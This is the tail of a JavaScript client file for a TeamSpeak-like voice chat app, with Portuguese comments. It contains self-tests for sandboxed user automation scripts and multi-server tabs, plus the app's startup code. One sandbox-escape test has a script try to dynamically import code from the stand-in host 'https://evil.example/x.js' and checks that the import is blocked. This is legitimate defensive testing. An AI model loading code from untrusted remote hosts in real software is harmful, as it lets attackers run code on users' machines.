        await scr.start({ source: 'pattern-js', quality: 720, fps: 15 }); await wait(60);
        await call('JoinChannel', 6, ''); await wait(120);
        chk('screenEndsOnLeave', !scr.sharing() && $('screenIndicator').hidden);
      }
      // scripts (automações): criar a partir de um exemplo, ligar, reagir a eventos, erros, isolamento, apagar.
      // Só com ?scripts na URL: cada script roda num Web Worker, em tempo real, que o relógio acelerado dos testes não espera.
      if (new URLSearchParams(location.search).has('scripts')) {
        const FS = window.FuritoScripts;
        const until = async (cond, ms) => { const t0 = performance.now(); while (performance.now() - t0 < ms) { if (await cond()) return true; await new Promise((r) => setTimeout(r, 50)); } return false; };
        const chanText = () => tabs.get('channel').view.textContent;
        $('tbScripts').click(); await wait(40);
        const sd = topDlg();
        const sq = (sel) => sd.querySelector(sel);
        const logText = () => sq('.scr-log').textContent;
        const type = (text) => { sq('.scr-code').value = text; sq('.scr-code').dispatchEvent(new Event('input', { bubbles: true })); };
        // o script de exemplos já vem na lista: desligado, sem poder moderar, com todas as funções
        const ex = FS.list()[0] || {};
        chk('scriptsDlg', FS.list().length === 1 && ex.name === 'Exemplos: todas as funções' && ex.enabled === false && ex.moderation === false && ex.status === 'off' &&
          sq('.scr-empty').hidden && !sq('.scr-edit').hidden && sq('.scr-name').value === ex.name && sq('.scr-status').textContent === 'desligado' &&
          ['const CONFIANCA = [];', "ts.on('clientJoined'", 'ts.kickFromServer(', 'ts.playSoundLocal(', "ts.at('12:00'"].every((x) => sq('.scr-code').value.includes(x)), JSON.stringify(FS.list().map((x) => [x.name, x.status])));

        // ligado com alguém na lista de confiança: atende comandos de outras pessoas
        const trusted = findClient(4), stranger = findClient(3);
        type(sq('.scr-code').value.replace('const CONFIANCA = [];', "const CONFIANCA = ['" + trusted.uid + "'];"));
        sq('.scr-on').click();
        await until(() => (FS.get(ex.id) || {}).status === 'running' && logText().includes('exemplos ligados'), 5000);
        chk('exampleRuns', FS.get(ex.id).status === 'running' && !logText().includes('lista de confiança vazia'), logText());
        await call('_mockSay', stranger.id, '!hora', false);
        chk('exampleOpenCommand', await until(() => /Agora são \d/.test(chanText()), 4000), logText());
        await call('_mockSay', stranger.id, '!quem', true);
        chk('exampleQueryCommand', await until(() => tabs.has('p:' + stranger.id) && tabs.get('p:' + stranger.id).view.textContent.includes('No canal ') && tabs.get('p:' + stranger.id).view.textContent.includes(state.self.nickname), 4000));
        await call('_mockSay', stranger.id, '!mudo', false);
        const denied = await until(() => logText().includes('!mudo de ' + stranger.nickname + ' não foi atendido'), 4000);
        chk('exampleUntrusted', denied && state.self.muted === false, logText());
        await call('_mockSay', trusted.id, '!mudo', false);
        chk('exampleTrustedMute', await until(() => state.self.muted === true, 4000), logText());
        // um script não abre o microfone: quem desmuta é o usuário
        let unmuteErr = '';
        try { await call('ScriptCall', ex.id, 'setMuted', { muted: false }); } catch (e) { unmuteErr = errText(e); }
        chk('scriptCannotUnmute', /só pode mutar/.test(unmuteErr) && state.self.muted === true, unmuteErr);
        await call('ToggleMute');
        await until(() => state.self.muted === false, 4000);
        await call('_mockSay', trusted.id, '!ausente já volto', false);
        chk('exampleTrustedAway', await until(() => state.self.away === true && state.self.awayMessage === 'já volto', 4000));
        await call('_mockSay', trusted.id, '!voltei', false);
        await until(() => state.self.away === false, 4000);
        await call('_mockSay', trusted.id, '!expulsar ' + stranger.nickname.split(' ')[0] + ' teste', false);
        chk('exampleModerationNeedsSwitch', await until(() => logText().includes('não tem permissão para moderar'), 4000) && findClient(stranger.id).channelId === stranger.channelId, logText());
        await call('_mockSay', trusted.id, '!toString', false); // nome que não é comando: ignorado, sem erro
        await call('_mockSay', trusted.id, '!banir ' + stranger.nickname.split(' ')[0], false);
        chk('exampleBanNeedsTime', await until(() => logText().includes('uso: !banir Apelido Minutos'), 4000) && !!findClient(stranger.id) && !/!tostring de|comando de [^:]+: !toString/.test(logText()), logText());
        sq('.scr-on').click();
        await until(() => FS.get(ex.id).status === 'off', 4000);

        // novo, a partir do exemplo de boas-vindas: nasce desligado e não reage
        sq('.scr-new').value = '0'; sq('.scr-new').dispatchEvent(new Event('change', { bubbles: true }));
        await until(() => FS.list().length === 2 && sq('.scr-name').value === 'Boas-vindas no canal', 3000);
        const sid = (FS.list().find((x) => x.name === 'Boas-vindas no canal') || {}).id;
        const cur = () => FS.get(sid) || {};
        chk('scriptNew', cur().name === 'Boas-vindas no canal' && cur().enabled === false && sq('.scr-code').value.includes("ts.on('clientJoined'") && sq('.scr-status').textContent === 'desligado' && sq('.scr-new').value === '', JSON.stringify(FS.list()));
        await call('_mockVisitor', true); await until(() => false, 300);
        chk('scriptOffIgnores', !chanText().includes('Visitante!'));
        await call('_mockVisitor', false);

        // editar e ligar: roda o que está no editor
        type(sq('.scr-code').value.replace('Bem-vindo, ', 'Salve, '));
        chk('scriptDirty', sq('.scr-status').textContent.includes('alterações não salvas') && !!sq('.scr-mod'));
        sq('.scr-on').click();
        await until(() => cur().status === 'running' && sq('.scr-status').textContent === 'rodando', 5000);
        chk('scriptRunning', cur().status === 'running' && cur().enabled && !sq('.scr-mod') && sq('.scr-status').textContent === 'rodando' && $('tbScripts').classList.contains('fx-on') && logText().includes('script iniciado') && !!sq('.scr-dot.running'), cur().status + ' ' + cur().error);
        await call('_mockVisitor', true);
        chk('scriptGreets', await until(() => chanText().includes('Salve, Visitante!'), 4000), logText());
        await call('_mockVisitor', false);

        // erro de sintaxe: o script para, o erro aparece na janela e no registro do servidor
        type("ts.log('a';\n");
        sq('.btn.primary').click();
        await until(() => cur().status === 'error' && sq('.scr-status').textContent === 'parado por erro' && logText().includes('SyntaxError'), 5000);
        chk('scriptSyntaxError', cur().status === 'error' && logText().includes('SyntaxError') && sq('.scr-status').textContent === 'parado por erro' && !$('tbScripts').classList.contains('fx-on') && tabs.get('server').view.textContent.includes('Script "Boas-vindas no canal"'), logText());

        // isolamento, consultas, eventos de mensagem e erro em tempo de execução (o script continua)
        type(["ts.log('rede:', typeof fetch, typeof XMLHttpRequest, typeof WebSocket, typeof importScripts, typeof postMessage);",
          // o que não dá para apagar (import dinâmico) é barrado pela política de segurança do worker
          "let saida = [typeof FontFace, typeof Notification, typeof (self.navigator || {}).sendBeacon];",
          "for (const alvo of ['/app.js', 'data:text/javascript,export default 1', 'https://evil.example/x.js']) { try { await import(alvo); saida.push('IMPORTOU'); } catch (e) { saida.push('barrado'); } }",
          "ts.log('fuga:', saida.join(' '));",
          "ts.on('message', (e) => ts.log('msg', e.target, e.client.nickname, e.text));",
          'const eu = await ts.getSelf();',
          "ts.log('eu:', eu.connected, eu.nickname, eu.channelName, (await ts.getClients()).length > 2, (await ts.getChannels()).length > 2);",
          'ts.after(0.2, () => { naoExiste(); });',
          "try { await ts.playSound('som que não existe'); } catch (e) { ts.log('som:', e.message); }",
          ''].join('\n'));
        sq('.scr-code').dispatchEvent(new KeyboardEvent('keydown', { key: 's', metaKey: true, bubbles: true, cancelable: true })); // Cmd+S salva
        await until(() => logText().includes('naoExiste') && logText().includes('som:'), 5000);
        const lg = logText();
        chk('scriptSandbox', lg.includes('rede: undefined undefined undefined undefined undefined'), lg);
        chk('scriptSandboxNoEscape', lg.includes('fuga: undefined undefined undefined barrado barrado barrado'), lg);
        chk('scriptQueries', lg.includes('eu: true ' + state.self.nickname) && lg.includes('true true') && lg.includes('som: não há som chamado'), lg);
        chk('scriptRuntimeError', cur().status === 'running' && /naoExiste.*\(linha 8\)/.test(lg) && !!sq('.scr-line.lv-error'), lg);
        await call('SendText', 1, 4, 'ping');
        chk('scriptMessageEvent', await until(() => logText().includes('msg private') && logText().includes('recebi: "ping"'), 4000), logText());

        // um script que inunda o registro e os pedidos num laço sem fim: a página segue viva e ele é encerrado
        type("ts.log('laço');\nts.after(0.3, () => { for (;;) { ts.log('x' + Math.random()); ts.getSelf(); } });\n");
        sq('.btn.primary').click();
        const tFlood = performance.now();
        const killed = await until(() => cur().status === 'error', 25000);
        const floodLines = FS.logOf(sid).length;
        chk('scriptFlood', killed && logText().includes('parou de responder') && floodLines <= 300 && performance.now() - tFlood < 22000, cur().status + ' linhas=' + floodLines + ' em ' + Math.round(performance.now() - tFlood) + ' ms');
        type("ts.on('message', (e) => ts.log('msg', e.target, e.client.nickname, e.text));\n");
        sq('.btn.primary').click();
        await until(() => cur().status === 'running', 5000);

        // moderação: sem "Pode moderar" o pedido é recusado; permitir pede confirmação; depois o script expulsa
        type(["try { ts.ban(1); } catch (e) { ts.log('ban sem tempo:', e.message); }",
          "ts.on('clientJoined', async (e) => {",
          "  try { await ts.kickFromChannel(e.client, 'teste'); ts.log('expulsou', e.client.nickname); } catch (err) { ts.log('recusado:', err.message); }",
          '});', ''].join('\n'));
        sq('.btn.primary').click();
        await until(() => cur().status === 'running' && logText().includes('ban sem tempo: ts.ban: informe a duração'), 5000);
        const kicks = () => (tabs.get('server').view.textContent.match(/Visitante.{0,12}foi expulso do canal/g) || []).length;
        await call('_mockVisitor', true);
        const refused = await until(() => logText().includes('recusado: este script não tem permissão para moderar'), 4000);
        chk('scriptModDenied', refused && kicks() === 0 && !cur().moderation && !sq('.scr-power').checked && !sq('.scr-badge'), logText());
        await call('_mockVisitor', false);
        sq('.scr-power').click(); await wait(40);
        const askMod = topDlg();
        chk('scriptModAsk', askMod !== sd && askMod.textContent.includes('expulsar, banir'));
        askMod.querySelector('.dlg-foot .btn').click(); await wait(60); // Cancelar: continua sem permissão
        chk('scriptModCancel', topDlg() === sd && !sq('.scr-power').checked && !cur().moderation);
        sq('.scr-power').click(); await wait(40);
        topDlg().querySelector('.btn.danger').click();
        await until(() => cur().moderation === true && cur().status === 'running' && !!sq('.scr-badge'), 5000);
        chk('scriptModAllowed', cur().moderation === true && sq('.scr-power').checked && !!sq('.scr-badge'));
        await call('_mockVisitor', true);
        chk('scriptModKicks', await until(() => logText().includes('expulsou Visitante') && kicks() === 1, 4000), logText() + ' kicks=' + kicks());
        await call('_mockVisitor', false);
        sq('.scr-power').click();
        await until(() => cur().moderation === false, 4000);
        chk('scriptModRevoked', cur().moderation === false && !sq('.scr-badge'));

        // referência
        Array.from(sd.querySelectorAll('.dlg-foot .btn')).find((b) => b.textContent.includes('Referência')).click(); await wait(40);
        const ref = topDlg();
        chk('scriptReference', ref !== sd && ref.textContent.includes('ts.sendChannelMessage(texto)') && ref.textContent.includes("'clientJoined'") && ref.textContent.includes('ts.every(segundos, fn)') && ref.textContent.includes('ts.kickFromChannel(cliente, motivo)') && ref.textContent.includes('ts.ban(cliente, segundos, motivo)'));
        ref._dismiss(); await wait(30);

        // alterações não salvas seguram o fechamento
        type(sq('.scr-code').value + '// mexi\n');
        sd._dismiss(); await wait(40);
        const ask = topDlg();
        chk('scriptUnsavedAsk', ask !== sd && ask.textContent.includes('alterações não salvas'));
        ask.querySelector('.dlg-foot .btn').click(); await wait(30); // Cancelar: continua aberta
        chk('scriptUnsavedKeep', topDlg() === sd && !!sq('.scr-mod'));

        // desligar para o script; apagar tira da lista
        sq('.scr-on').click();
        await until(() => cur().status === 'off' && !$('tbScripts').classList.contains('fx-on'), 4000);
        chk('scriptOff', cur().status === 'off' && cur().enabled === false && !sq('.scr-mod') && !$('tbScripts').classList.contains('fx-on'));
        sq('[data-act="del"]').click(); await wait(40);
        topDlg().querySelector('.btn.danger').click();
        await until(() => FS.list().length === 1 && sq('.scr-name').value === ex.name, 3000);
        chk('scriptDelete', FS.list().length === 1 && !sq('.scr-list').textContent.includes('Boas-vindas') && sq('.scr-name').value === ex.name);
        // "Novo…" também recria os exemplos, para quem apagou
        sq('.scr-new').value = String(FS.TEMPLATES.findIndex((x) => x.file)); sq('.scr-new').dispatchEvent(new Event('change', { bubbles: true }));
        await until(() => FS.list().length === 2 && sq('.scr-name').value === 'Exemplos: todas as funções 2', 4000);
        chk('exampleFromNew', FS.list().length === 2 && FS.list()[1].enabled === false && sq('.scr-code').value.includes('const CONFIANCA = [];') && sq('.scr-code').value.includes('ts.setTalker('), JSON.stringify(FS.list().map((x) => x.name)));
        sd._dismiss(); await wait(30);
        chk('scriptsClosed', !openModals.includes(sd));
      }
      // ---- abas de servidores (várias conexões)
      {
        const untilT = async (cond, ms) => { const t0 = performance.now(); while (performance.now() - t0 < (ms || 4000)) { if (cond()) return true; await wait(40); } return false; };
        const bar = $('serverTabs');
        const stab = (id) => bar.querySelector('.stab[data-stab="' + id + '"]');
        const treeText = () => $('tree').textContent;
        const chatText = () => $('chatViews').textContent;
        const micAt = () => (state.tabs.find((t) => t.mic) || {}).id;
        const ctrlTab = () => document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Tab', code: 'Tab', ctrlKey: true, bubbles: true, cancelable: true }));
        const go = async (id) => { stab(id).click(); await untilT(() => state.tab === id && !chatLoading); };
        await call('SetPokePopup', true);
        const A = state.tab;
        const peopleA = state.clients.map((c) => ({ id: c.id, nickname: c.nickname }));
        const selA = JSON.stringify(selection), chatA = activeTab, orderA = tabOrder.join(','), draftA = $('chatInput').value;
        chk('tabsHiddenWithOne', bar.hidden && state.tabs.length === 1 && state.tabs[0].mic && $('micWhere').hidden, JSON.stringify(state.tabs));

        // "Em nova aba" no diálogo de conectar: a barra aparece e a aba nova fica à vista
        $('tbConnect').click(); await wait(60);
        chk('tabsOfferedInDialog', !$('cNewTabRow').hidden && !$('cNewTab').checked);
        $('cHost').value = 'escritorio.exemplo.com';
        $('cNewTab').checked = true;
        $('connectOk').click();
        await untilT(() => state.tab !== A && state.status === 'connected' && !chatLoading && $('dlgConnect').hidden);
        const B = state.tab;
        chk('tabsOpened', B !== A && !bar.hidden && bar.querySelectorAll('.stab').length === 2 && !!stab(B) && stab(B).classList.contains('active') && stab(B).textContent.includes('Escritório') && stab(A).textContent.includes('TeamSpeak 6 Server'), JSON.stringify(state.tabs));
        chk('tabsTreeIsNewServer', treeText().includes('Recepção') && !treeText().includes('Counter-Strike') && tabs.get('server').label === 'Escritório', tabs.get('server').label);
        chk('tabsChatIsNewServer', chatText().includes('Bem-vindo ao servidor do escritório') && !chatText().includes('TeamSpeak 6 Server') && tabOrder.join(',') === 'server,channel', tabOrder.join(','));
        // o microfone não muda de servidor por causa da aba nova, e a barra de estado diz onde ele está
        chk('tabsMicStays', micAt() === A && !!stab(A).querySelector('.stab-mic.on') && !!stab(B).querySelector('[data-mic]') && !$('micWhere').hidden && $('micWhere').classList.contains('elsewhere') && $('micWhere').textContent.includes('TeamSpeak 6 Server'), $('micWhere').textContent);

        // os mesmos números de cliente nos dois servidores: cada aba mostra a pessoa dela
        const twin = state.clients.find((c) => c.id !== state.self.clientId && peopleA.some((x) => x.id === c.id && x.nickname !== c.nickname));
        const twinA = twin ? peopleA.find((x) => x.id === twin.id).nickname : '';
        if (twin) fire(row('client', twin.id), 'mousedown');
        chk('tabsSameIdOtherPerson', !!twin && $('info').textContent.includes(twin.nickname) && !$('info').textContent.includes(twinA), twin ? twin.id + ' ' + twin.nickname + '/' + twinA : 'sem id repetido');

        // seleção, bate-papo e rascunho ficam com a aba
        fire(row('channel', 3), 'mousedown');
        $('chatInput').value = 'rascunho B';
        await go(A);
        chk('tabsBackToFirst', treeText().includes('Counter-Strike') && !treeText().includes('Recepção') && JSON.stringify(selection) === selA && activeTab === chatA && tabOrder.join(',') === orderA &&
          $('chatInput').value === draftA && chatText().includes('TeamSpeak 6 Server') && !chatText().includes('servidor do escritório') && stab(A).classList.contains('active'),
          JSON.stringify(selection) + ' ' + activeTab + ' ' + tabOrder.join(','));

        // scripts: cada script ligado roda uma vez por servidor, e cada cópia fala com o servidor dela
        if (new URLSearchParams(location.search).has('scripts')) {
          const FS = window.FuritoScripts;
          const sc = await FS.save({ name: 'Uma cópia por servidor', code: "ts.getSelf().then((s) => ts.log('aqui é ' + s.server));\n", enabled: true });
          const lines = () => FS.logOf(sc.id).map((l) => l.text);
          await untilT(() => lines().filter((x) => x.includes('aqui é')).length === 2, 6000);
          chk('tabsScriptPerServer', FS.instances(sc.id).slice().sort().join(',') === [A, B].sort().join(',') &&
            lines().includes('[TeamSpeak 6 Server] aqui é TeamSpeak 6 Server') && lines().includes('[Escritório] aqui é Escritório'), FS.instances(sc.id).join(',') + ' ' + JSON.stringify(lines()));
          await FS.remove(sc.id);
          chk('tabsScriptRemoved', FS.instances(sc.id).length === 0 && !FS.get(sc.id));
        }
        if (twin) { fire(row('client', twin.id), 'mousedown'); chk('tabsSameIdFirstServer', $('info').textContent.includes(twinA) && !$('info').textContent.includes(twin.nickname)); }
        $('chatInput').value = 'rascunho A';
        const unreadA = tabs.get('channel').unread; // o que já estava por ler no canal da aba A
        await go(B);
        chk('tabsSelectionPerTab', !!selection && selection.type === 'channel' && selection.id === 3 && $('info').textContent.includes('Reunião semanal') && $('chatInput').value === 'rascunho B', JSON.stringify(selection) + ' ' + $('chatInput').value);

        // alguém compartilha a tela na aba de fundo: o aviso não marca a pessoa de mesmo número na aba à vista
        if (twin && twin.id === 3) {
          await callOn(A, '_mockPeerShare', true); await wait(150);
          chk('tabsScreenSignalStaysInTab', !!row('client', 3) && !row('client', 3).querySelector('[data-act="watch-screen"]') && !window.FuritoScreen.isSharer(3));
          await callOn(A, '_mockPeerShare', false); await wait(80);
        }

        // mensagem numa aba fora da vista: vira não lida na barra e não entra no bate-papo à vista
        await callOn(A, '_mockSay', peopleA.find((x) => x.id !== state.self.clientId).id, 'mensagem na aba de fundo');
        await untilT(() => !!stab(A).querySelector('.badge'), 1500);
        chk('tabsUnreadBadge', !!stab(A).querySelector('.badge') && stab(A).querySelector('.badge').textContent === '1' && stab(A).classList.contains('unread') && !chatText().includes('mensagem na aba de fundo'), JSON.stringify(state.tabs));
        await go(A);
        chk('tabsUnreadShown', chatText().includes('mensagem na aba de fundo') && !stab(A).querySelector('.badge') && (activeTab === 'channel' || tabs.get('channel').unread === unreadA + 1) && $('chatInput').value === 'rascunho A', activeTab + ' ' + tabs.get('channel').unread + ' (antes ' + unreadA + ')');
        $('chatInput').value = draftA;

        // passar o microfone: um clique no microfone da outra aba; a barra de estado traz de volta
        stab(B).querySelector('[data-mic]').click();
        await untilT(() => micAt() === B);
        chk('tabsMicMoves', micAt() === B && !!stab(B).querySelector('.stab-mic.on') && !!stab(A).querySelector('[data-mic]') && $('micWhere').classList.contains('elsewhere') && $('micWhere').textContent.includes('Escritório'), $('micWhere').textContent);
        $('micWhere').click();
        await untilT(() => micAt() === A);
        chk('tabsMicHere', micAt() === A && !$('micWhere').hidden && !$('micWhere').classList.contains('elsewhere') && $('micWhere').textContent.includes('neste servidor'), $('micWhere').textContent);

        // menu da aba: silenciar só aquele servidor
        fire(stab(B), 'contextmenu', { button: 2 });
        const silence = Array.from($('ctxMenu').querySelectorAll('.menu-item')).find((x) => x.textContent.includes('Silenciar este servidor'));
        chk('tabsMenu', !$('ctxMenu').hidden && !!silence && $('ctxMenu').textContent.includes('Falar neste servidor') && $('ctxMenu').textContent.includes('Fechar aba'), $('ctxMenu').textContent);
        if (silence) silence.click();
        await untilT(() => (findTab(B) || {}).silenced === true, 1500);
        chk('tabsSilenced', findTab(B).silenced && stab(B).classList.contains('silenced') && !!stab(B).querySelector('.stab-mark') && !findTab(A).silenced, JSON.stringify(state.tabs));
        await callOn(B, 'SetTabSilenced', false);
        await untilT(() => !findTab(B).silenced, 1500);

        // troca rápida A→B→A: vale a última pedida, com o bate-papo dela (a resposta atrasada da outra é descartada)
        switchServerTab(B); switchServerTab(A);
        await wait(300);
        await untilT(() => state.tab === A && !chatLoading);
        chk('tabsQuickSwitch', state.tab === A && treeText().includes('Counter-Strike') && chatText().includes('mensagem na aba de fundo') && !chatText().includes('servidor do escritório') && stab(A).classList.contains('active') && tabOrder.join(',') === orderA, tabOrder.join(','));

        // a transmissão de tela é da aba em que começou: continua ao olhar outra aba, e a interface diz onde ela está (só com ?rtc, em tempo real)
        if (new URLSearchParams(location.search).has('rtc')) {
          const scr = window.FuritoScreen, mine = () => row('client', state.self.clientId).querySelector('.sicon.screen.mine');
          await scr.start({ source: 'pattern-js', quality: 720, fps: 15 }); await wait(60);
          const was = !!scr.sharing() && !!mine();
          await go(B); await wait(60);
          const sh = scr.sharing() || {};
          chk('tabsScreenShareStaysInItsTab', was && sh.tab === A && sh.here === false && !mine() && !$('screenIndicator').hidden && $('screenIndicator').textContent.includes('em TeamSpeak 6 Server') && $('tbScreen').classList.contains('active'), JSON.stringify(sh) + ' ' + $('screenIndicator').textContent);
          await go(A); await wait(60);
          chk('tabsScreenShareBack', !!scr.sharing() && scr.sharing().here === true && !!mine() && !$('screenIndicator').textContent.includes(' em '));
          $('screenIndicator').click(); await wait(80);
        }

        // teclado: Ctrl+Tab e Cmd+número; com um diálogo aberto não se troca de aba
        ctrlTab();
        await untilT(() => state.tab === B && !chatLoading);
        chk('tabsCtrlTab', state.tab === B);
        document.dispatchEvent(new KeyboardEvent('keydown', { key: '1', code: 'Digit1', metaKey: true, bubbles: true, cancelable: true }));
        await untilT(() => state.tab === A && !chatLoading);
        chk('tabsCmdNumber', state.tab === A);
        openAbout(); await wait(30);
        ctrlTab(); stab(B).click(); onMenu('nextTab');
        await wait(250);
        chk('tabsDialogBlocksSwitch', state.tab === A && !$('dlgAbout').hidden);
        closeAbout(); await wait(30);

        // cutucada numa aba fora da vista: a janela diz de que servidor veio
        if (twin) {
          await callOn(B, 'PokeClient', twin.id, 'oi');
          await untilT(() => !!(pokeDlg && !pokeDlg.closed), 2500);
          chk('tabsPokeSaysServer', !!pokeDlg && !pokeDlg.closed && pokeDlg.el.textContent.includes('em "Escritório"'), pokeDlg ? pokeDlg.el.textContent : 'sem janela');
          if (pokeDlg && !pokeDlg.closed) pokeDlg.close();
        }

        // fechar a aba em que se fala: pede confirmação; sobrando uma conexão, o microfone vai para ela e a barra some
        await callOn(B, 'SetMicTab');
        await untilT(() => micAt() === B);
        stab(B).querySelector('[data-close]').click(); await wait(40);
        const cd = topDlg();
        chk('tabsCloseAsks', !!cd && cd.textContent.includes('Escritório') && state.tabs.length === 2);
        if (cd) cd.querySelector('.dlg-foot .btn.primary').click();
        await untilT(() => state.tabs.length === 1);
        chk('tabsClosed', state.tabs.length === 1 && state.tab === A && bar.hidden && $('micWhere').hidden && micAt() === A && state.status === 'connected' && treeText().includes('Counter-Strike'), JSON.stringify(state.tabs));

        // tentativa em nova aba que falha: o erro aparece no diálogo e, ao cancelar, a aba vazia não fica para trás
        onMenu('newTab'); await wait(60);
        chk('tabsMenuNewTab', !$('dlgConnect').hidden && !$('cNewTabRow').hidden && $('cNewTab').checked);
        $('cHost').value = 'erro.exemplo.com';
        $('connectOk').click();
        await untilT(() => state.tabs.length === 2 && state.status === 'disconnected' && $('connectError').textContent !== '', 3000);
        chk('tabsFailedAttempt', state.tab !== A && $('connectError').textContent.includes('Falha ao conectar') && $('cNewTabRow').hidden && micAt() === A && !$('dlgConnect').hidden, $('connectError').textContent + ' ' + JSON.stringify(state.tabs));
        $('connectCancel').click();
        await untilT(() => state.tabs.length === 1 && state.tab === A && !chatLoading);
        chk('tabsFailedAttemptCleans', state.tabs.length === 1 && state.tab === A && state.status === 'connected' && bar.hidden && $('dlgConnect').hidden && treeText().includes('Counter-Strike'), JSON.stringify(state.tabs));

        // três servidores: sair daquele em que se fala deixa o microfone sem destino (a voz não pula para outro) até a pessoa escolher
        const B2 = Number(await call('ConnectNewTab', { host: 'escritorio.exemplo.com', nickname: state.self.nickname }));
        await untilT(() => state.tab === B2 && state.status === 'connected' && !chatLoading);
        const C = Number(await call('ConnectNewTab', { host: 'outro.exemplo.com', nickname: state.self.nickname }));
        await untilT(() => state.tab === C && state.status === 'connected' && !chatLoading);
        await callOn(A, 'Disconnect');
        await untilT(() => micAt() === undefined && (findTab(A) || {}).status === 'disconnected', 1500);
        chk('tabsMicWithoutServer', state.tabs.length === 3 && micAt() === undefined && !$('micWhere').hidden && $('micWhere').classList.contains('none') && $('micWhere').textContent.includes('Microfone sem servidor') && !stab(A).querySelector('.stab-mic'),
          $('micWhere').textContent + ' ' + JSON.stringify(state.tabs));
        $('micWhere').click();
        await untilT(() => micAt() === C, 1500);
        chk('tabsMicChosenAgain', micAt() === C && !$('micWhere').classList.contains('none') && $('micWhere').textContent.includes('neste servidor'), $('micWhere').textContent);
        // volta ao começo: só a primeira aba, conectada
        await callOn(C, 'CloseTab');
        await callOn(B2, 'CloseTab');
        await untilT(() => state.tabs.length === 1 && state.tab === A && !chatLoading);
        await call('Connect', { host: 'localhost', nickname: state.self.nickname });
        await untilT(() => state.status === 'connected' && micAt() === A);
      }
      $('tbDisconnect').click(); await wait(30);
      out.push('status=' + state.status + ' input=' + $('chatInput').disabled + ' tabs=' + tabOrder.join(','));
      // a última aba não fecha (fica desconectada) e, parada, é reaproveitada por "nova aba"
      {
        const only = state.tab;
        await call('CloseTab'); await wait(30);
        chk('tabsLastOneStays', state.tabs.length === 1 && state.tab === only && state.status === 'disconnected');
        const used = await call('ConnectNewTab', { host: 'localhost', nickname: 'Furico Caolho' });
        await wait(30);
        chk('tabsIdleTabReused', used === only && state.tabs.length === 1 && state.status === 'connecting', used + ' ' + JSON.stringify(state.tabs));
      }
    } catch (e) { out.push('EXCEPTION ' + errText(e)); }
    showBanner('SELFTEST ' + out.join(' | '));
  }

  // ------------------------------------------------------------------ inicialização
  async function start() {
    window.addEventListener('error', (e) => showBanner('Erro na interface: ' + (e.message || 'desconhecido')));
    window.addEventListener('unhandledrejection', (e) => showBanner('Erro na interface: ' + errText(e.reason)));

    createTab('server', 'server', 0, 'Servidor');
    createTab('channel', 'channel', 0, 'Canal');
    bindUI();
    activateTab('server');
    renderTree(); renderInfo(); renderChrome();

    bridge = await window.FuritoBridge.init();
    api = bridge.api;
    if (bridge.isMock) $('mockBadge').hidden = false;
    if (bridge.missingBackend) showBanner('Backend não encontrado — exibindo dados de demonstração.');

    bridge.on('state', onState);
    bridge.on('tabs', onTabs);
    bridge.on('talking', onTalking);
    bridge.on('menu', onMenu);
    bridge.on('poke', onPoke);
    bridge.on('screen:signal', (sig) => window.FuritoScreen.onSignal(sig)); // cada sinal diz de que aba é; screen.js separa
    bridge.on('message', onMessage); // até o histórico inicial chegar, o que vier espera em chatQueue

    try {
      const [st, history] = await Promise.all([call('GetState'), call('GetMessages')]);
      (Array.isArray(history) ? history : []).forEach((m) => appendMessage(m, true));
      onState(st);
    } catch (e) {
      showBanner('Falha ao carregar o estado inicial: ' + errText(e));
    }
    if (chatEpoch === 0) { // (se já houve troca de aba, é loadChat quem libera a fila)
      chatLoading = false;
      const queued = chatQueue;
      chatQueue = [];
      queued.forEach((m) => { if (!m.tab || !curTab || m.tab === curTab) appendMessage(m, false); });
    }

    // automações do usuário: liga os scripts guardados
    window.FuritoScripts.init({ call, forTab: (id) => bridge.forTab(id), on: bridge.on, notify: (level, text) => localLine(level, text) })
      .catch((e) => localLine('error', 'Scripts: ' + errText(e)));
    scriptTabsSig = '';
    tabsChanged(); // os scripts passam a saber quais abas existem

    if (bridge.isMock) {
      const demo = new URLSearchParams(location.search).get('demo');
      if (demo) runDemo(demo);
    }
  }

  if (document.readyState === 'complete') start();
  else window.addEventListener('load', start);
})();
